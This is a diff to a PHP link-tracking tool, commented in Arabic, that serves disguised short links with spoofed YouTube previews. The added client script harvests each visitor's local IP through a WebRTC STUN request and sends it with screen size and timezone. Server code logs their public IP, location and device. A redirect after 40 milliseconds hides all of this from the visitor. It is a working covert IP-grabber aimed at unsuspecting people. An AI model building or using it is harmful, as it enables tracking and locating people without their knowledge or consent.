@@ -7,8 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker.db');
-    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -40,17 +39,16 @@ try {
 }
 
 // دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
-function fetch_real_meta($url) {
-    $title = "";
+function fetch_real_meta($url) {$title = "";
     $image = "";
 
-    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
-        $video_id = $matches[1];
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
+        $video_id =$matches[1];
         $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
         
         $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $oembed_url);
+        curl_setopt($ch, CURLOPT_URL,$oembed_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 1);
         $json = curl_exec($ch);
@@ -59,13 +57,12 @@ function fetch_real_meta($url) {
         if ($json) {
             $data = json_decode($json, true);
             if (isset($data['title'])) {
-                $title = $data['title'];
+                $title =$data['title'];
             }
         }
     }
 
-    if (empty($title)) {
-        $ch = curl_init();
+    if (empty($title)) {$ch = curl_init();
         curl_setopt($ch, CURLOPT_URL,$url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -153,7 +150,7 @@ function get_ip_details($ip) {
     return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
 }
 
-// 1. معالجة التوجيه السريع جداً مع حفظ السجلات
+// 1. معالجة التوجيه وتسجيل السجلات
 $og_title = "Secure Terminal";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
@@ -168,27 +165,15 @@ if (isset($_GET['r'])) {
         $og_title =$link['meta_title'];
         $og_image =$link['meta_image'];
 
-        // إذا أرسل المتصفح بيانات الشاشة والـ IP المحلي عبر طلب خلفي (AJAX)
+        // استقبال البيانات المرسلة من المتصفح عبر طلب خلفي سريع (AJAX)
         if (isset($_GET['ajax_log']) &&$_GET['ajax_log'] == '1') {
-            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'N/A';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
+            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'Cellular / Direct';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
 
             try {
                 $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
             } catch (Exception $e) {}
             exit('OK');
-        }
-
-        // تسجيل الـ IP العام والبيانات الأساسية فوراً ثم التوجيه البرقي الفوري
-        if (!isset($_GET['screen'])) {
-            $public_ip = get_real_ip();$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$created_at = date('Y-m-d H:i:s');
-
-            try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, 'Pending', ?, ?, ?, ?, ?, ?, ?, 'Pending', 'Pending', ?)");
-                $logStmt->execute([$code,$public_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$created_at]);
-            } catch (Exception $e) {}
-
-            // توجيه فوري للمتصفح نحو يوتيوب مع إكمال باقي البيانات في واجهة الاستعراض الصامتة
         }
     } else {
         die("Link not found.");
@@ -295,14 +280,46 @@ if (!empty($filter_code)) {
         footer span { color: #38bdf8; font-weight: 600; }
     </style>
     <script>
+        // جمع البيانات محلياً وإرسالها في الخلفية دون تأخير التوجيه البرقي
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
             
-            <?php if (isset($target) && !isset($_GET['screen'])): ?>
+            <?php if (isset($target) && isset($_GET['r'])): ?>
             if (redirectCode) {
-                // التوجيه الفوري البرقي نحو يوتيوب أو الرابط المستهدف
-                window.location.replace("<?php echo $target; ?>");
+                let localIp = "Cellular / Direct";
+                let screenRes = screen.width + "x" + screen.height;
+                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (RTCPeerConnection) {
+                    try {
+                        let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                        pc.createDataChannel("");
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                        pc.onicecandidate = function(ice) {
+                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                            let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                            if (myIP) {
+                                let ip = myIP[1];
+                                if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                                    localIp = ip;
+                                }
+                            }
+                        };
+                    } catch (e) {}
+                }
+
+                // إرسال البيانات وسجل IP المحلي خلال 40 ملي ثانية ثم التوجيه الفوري نحو يوتيوب
+                setTimeout(function() {
+                    const logUrl = `/?r=${redirectCode}&ajax_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(logUrl);
+                    } else {
+                        fetch(logUrl, { method: 'GET', keepalive: true });
+                    }
+                    window.location.replace("<?php echo $target; ?>");
+                }, 40);
             }
             <?php endif; ?>
         });
